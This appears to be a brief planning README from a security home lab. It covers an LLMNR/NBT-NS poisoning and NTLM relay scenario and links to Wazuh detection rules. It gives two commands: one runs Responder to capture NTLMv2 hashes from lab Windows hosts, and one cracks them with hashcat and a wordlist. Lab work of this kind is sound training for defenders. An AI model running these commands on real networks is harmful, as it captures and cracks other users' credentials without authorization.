# Scenario 07 — LLMNR/NBT-NS Poisoning & NTLM Relay

![MITRE](https://img.shields.io/badge/MITRE-T1557.001-red)
![Status](https://img.shields.io/badge/Status-Planned-yellow)
![Tool](https://img.shields.io/badge/Tool-Responder%20%7C%20NetExec-orange)

## MITRE ATT&CK
- T1557.001 — LLMNR/NBT-NS Poisoning
- T1563 — Remote Service Session Hijacking

## Tools
- Responder
- CrackMapExec

## 5.1 LLMNR Poisoning

### Attack
```bash
sudo responder -I eth0 -rdw
```

### Expected output
- Captured NTLMv2 hashes from Win7 and Win Server

### Crack
```bash
hashcat -m 5600 ntlmv2_hash.txt /usr/share/wordlists/rockyou.txt
```

## Detection
See: 05-detection/wazuh-rules/05-pivoting-detection.md
